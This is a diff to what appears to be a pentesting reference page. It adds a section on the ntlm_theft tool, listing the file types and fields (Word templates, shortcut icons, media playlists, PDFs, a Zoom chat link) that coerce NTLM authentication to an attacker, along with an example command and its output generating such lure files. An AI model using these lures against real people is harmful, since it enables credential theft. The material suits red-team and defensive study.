@@ -6,6 +6,59 @@
 
 This tool will **create several documents/files** that if accessed by the user somehow they will **start a NTLM authentication with the attacker**.
 
+#### ntlm_theft supports the following attack types:
+Browse to Folder Containing:
+- .url – via URL field
+- .url – via ICONFILE field
+- .lnk - via icon_location field
+- .scf – via ICONFILE field (Not Working on Latest Windows)
+- autorun.inf via OPEN field (Not Working on Latest Windows)
+- desktop.ini - via IconResource field (Not Working on Latest Windows)
+
+Open Document:
+- .xml – via Microsoft Word external stylesheet
+- .xml – via Microsoft Word includepicture field
+- .htm – via Chrome & IE & Edge img src (only if opened locally, not hosted)
+- .docx – via Microsoft Word includepicture field
+-.docx – via Microsoft Word external template
+-.docx – via Microsoft Word frameset webSettings
+-.xlsx - via Microsoft Excel external cell
+-.wax - via Windows Media Player playlist (Better, primary open)
+-.asx – via Windows Media Player playlist (Better, primary open)
+-.m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)
+-.jnlp – via Java external jar
+-.application – via any Browser (Must be served via a browser downloaded or won’t run)
+
+Open Document and Accept Popup:
+- .pdf – via Adobe Acrobat Reader
+
+
+Click Link in Chat Program:
+- .txt – formatted link to paste into Zoom chat
+
+> Example :
+```sh
+# python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
+Created: test/test.scf (BROWSE)
+Created: test/test-(url).url (BROWSE)
+Created: test/test-(icon).url (BROWSE)
+Created: test/test.rtf (OPEN)
+Created: test/test-(stylesheet).xml (OPEN)
+Created: test/test-(fulldocx).xml (OPEN)
+Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: test/test-(includepicture).docx (OPEN)
+Created: test/test-(remotetemplate).docx (OPEN)
+Created: test/test-(frameset).docx (OPEN)
+Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: test/test.asx (OPEN)
+Created: test/test.jnlp (OPEN)
+Created: test/test.application (DOWNLOAD AND OPEN)
+Created: test/test.pdf (OPEN AND ALLOW)
+Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
+Generation Complete.
+```
+
+
 ### [All\_NTLM-Leak](https://github.com/Gl3bGl4z/All_NTLM_leak)
 
 This is a list of techniques to force NTLM authentications to steal credentials from the victim.
